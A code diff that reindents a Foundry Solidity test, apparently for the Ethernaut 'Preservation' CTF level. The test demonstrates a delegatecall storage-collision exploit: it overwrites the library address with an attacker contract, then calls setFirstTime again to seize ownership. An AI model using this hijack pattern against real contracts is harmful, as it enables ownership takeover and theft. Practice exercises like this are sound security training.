@@ -21,16 +21,16 @@ contract PreservationTest is Test {
     }
 
     function testAttack() public {
-    preservation.setFirstTime(uint256(uint160(address(attacker))));
-    // Let's make sure that the library address was changed
-    assertEq(preservation.timeZone1Library(), address(attacker));
+        preservation.setFirstTime(uint256(uint160(address(attacker))));
+        // Let's make sure that the library address was changed
+        assertEq(preservation.timeZone1Library(), address(attacker));
 
-    // Now let's call setFirstTime again, but this time the delegatecall
-    // will execute the attacker's setTime() function
-    vm.prank(USER);
-    preservation.setFirstTime(uint256(0));
+        // Now let's call setFirstTime again, but this time the delegatecall
+        // will execute the attacker's setTime() function
+        vm.prank(USER);
+        preservation.setFirstTime(uint256(0));
 
-    // Now let's verify that USER became the owner
-    assertEq(preservation.owner(), USER);
-}
+        // Now let's verify that USER became the owner
+        assertEq(preservation.owner(), USER);
+    }
 }
